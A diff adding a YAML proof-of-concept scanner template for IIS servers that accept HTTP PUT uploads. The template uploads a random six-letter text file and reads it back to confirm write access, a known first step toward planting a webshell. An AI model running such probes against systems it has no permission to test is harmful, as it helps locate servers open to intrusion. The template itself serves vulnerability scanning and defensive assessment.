@@ -1,0 +1,28 @@
+detail:
+  author: Cannae(github.com/thunderbarca)
+  links:
+  - https://www.cnblogs.com/-mo-/p/11295400.html
+expression: r0() && r1()
+manual: true
+name: poc-yaml-iis-put-getshell
+rules:
+  r0:
+    expression: response.status == 201
+    request:
+      body: '{{fileContent}}
+
+        '
+      cache: true
+      method: PUT
+      path: /{{filename}}.txt
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(fileContent))
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /{{filename}}.txt
+set:
+  fileContent: randomLowercase(6)
+  filename: randomLowercase(6)
+transport: http
